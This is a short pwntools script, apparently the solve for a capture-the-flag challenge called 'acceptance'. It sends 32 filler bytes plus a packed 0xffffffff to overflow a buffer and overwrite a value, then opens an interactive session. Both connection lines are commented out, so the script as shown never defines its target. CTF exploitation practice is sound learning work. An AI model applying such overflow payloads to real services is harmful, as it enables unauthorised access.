from pwn import *

# p = process('./acceptance')
# p = connect("0.tcp.ngrok.io", 15643)

payload = b'A'*32
payload += p32(0xffffffff)

p.recvuntil(b'Help him: ')
p.send(payload)

p.interactive()